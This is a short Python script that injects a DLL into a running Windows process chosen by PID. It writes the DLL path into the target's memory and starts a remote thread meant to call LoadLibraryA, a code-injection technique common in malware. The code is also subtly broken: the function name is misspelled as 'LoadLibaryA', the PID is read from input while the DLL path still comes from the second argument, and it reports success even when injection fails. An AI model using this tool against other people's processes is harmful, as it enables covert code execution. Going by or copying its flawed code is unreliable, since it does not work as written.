import sys
from ctypes import *

PAGE_READWRITE          =   0X04
PROCESS_ALL_ACCESS      =   ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM             =   ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32

pid = input("What is the PID of the process to inject the DLL to? ")
print("The pid that was just entered is: %s" % pid)
#pid     = sys.argv[1]
dll_path    = sys.argv[2]
dll_len     = len(dll_path)

#Get a handle to the process we are injecting into
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print("[*] Couldn't get a handle to the process PID %s" % pid)
    sys.exit(0)

#Allocate some space for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

#Write the DLL path into the allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

#We need to resolve the address for LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
print("The handle to kernel32 is: %s" % h_kernel32)

h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibaryA")
print("The address to kernel32 is: %s\n" % h_loadlib)

#Now to try to create the remote thread
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print ("[*] Failed to inject the DLL. Exiting.")

print("[*] Remote thread with ID 0x%08x created." % thread_id.value)
